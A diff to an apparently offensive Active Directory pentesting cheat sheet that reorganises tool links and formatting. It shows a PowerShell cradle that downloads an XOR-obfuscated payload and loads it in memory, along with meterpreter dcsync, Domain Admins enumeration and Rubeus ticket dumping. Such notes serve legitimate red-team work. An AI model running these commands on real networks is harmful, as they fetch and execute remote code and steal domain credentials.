@@ -3,11 +3,15 @@
 ## Tools
 
 - Bloodhound
-- PowerView
-- RSAT
+* [https://github.com/PowerShellMafia/PowerSploit](https://github.com/PowerShellMafia/PowerSploit) (PowerView)
+- [RSAT](https://download.microsoft.com/download/1/D/8/1D8B5022-5477-4B9A-8104-6A71FF9D98AB/WindowsTH-RSAT_WS_1709-x64.msu)
+> After installing RSAT, you can go to "Users and Computers AD =&gt; View =&gt; Advanced"
 
-## ACLs
+## ACLs
 
+## ACLs
+
+## ACLs
 Get ACL
 
 ```bash
@@ -33,15 +37,11 @@ meterpreter > dcsync_ntlm <DOMAIN>\<user>
 - Incognito.exe
 - CrackMapExec
 - [TokenManipulation.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/c7985c9bc31e92bb6243c177d7d1d7e68b6f1816/Exfiltration/Invoke-TokenManipulation.ps1)
-
-
-Can also use incognito from meterpreter to steal access/delegation tokens and impersonate users. (Requires Admin/SYSTEM Privs)
-
-Tokenvator https://github.com/0xbadjuju/Tokenvator
+- [Tokenvator](https://github.com/0xbadjuju/Tokenvator)
 
 Reflectively Load it with Powershell, Cobalt, SilentTrinity etc...
 
-```
+```powershell
 $wc=New-Object System.Net.WebClient;$wc.Headers.Add("User-Agent","Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:49.0) Gecko/20100101 Firefox/49.0");$wc.Proxy=[System.Net.WebRequest]::DefaultWebProxy;$wc.Proxy.Credentials=[System.Net.CredentialCache]::DefaultNetworkCredentials
 $k="xxxxxxx";$i=0;[byte[]]$b=([byte[]]($wc.DownloadData("https://xxxxx")))|%{$_-bxor$k[$i++%$k.length]}
 [System.Reflection.Assembly]::Load($b) | Out-Null
@@ -56,7 +56,7 @@ Reflectively Load .NET Assembly within Powershell if you cant do it through your
 
 Find domain admin accounts 
 
-```bash
+```bat
 net group "Domain Admins" /DOMAIN
 net group "Admins du domaine" /DOMAIN
 ```
@@ -70,7 +70,7 @@ bloodhound.py -d <domain> -u <user> -p <password> -ns <IP-DC> -c LoggedOn
 
 Impersonate kerberos token
 
-```bash
+```bat
 # Rubeus
 Rubeus.exe klist
 Rubeus.exe dump
@@ -110,9 +110,9 @@ Get-ADComputer -Identity <computer_name> -Properties TrustedForDelegation
 ```
 
 ### Manual testing
+
 https://www.secureauth.com/blog/kerberos-delegation-spns-and-more/
 
+### Delegation Explained
 
-## Remote GUI domain \(RSAT\)
-
-* [https://download.microsoft.com/download/1/D/8/1D8B5022-5477-4B9A-8104-6A71FF9D98AB/WindowsTH-RSAT\_WS\_1709-x64.msu](https://download.microsoft.com/download/1/D/8/1D8B5022-5477-4B9A-8104-6A71FF9D98AB/WindowsTH-RSAT_WS_1709-x64.msu) \(Users and Computers AD =&gt; View =&gt; Advanced\)
+https://posts.specterops.io/hunting-in-active-directory-unconstrained-delegation-forests-trusts-71f2b33688e1
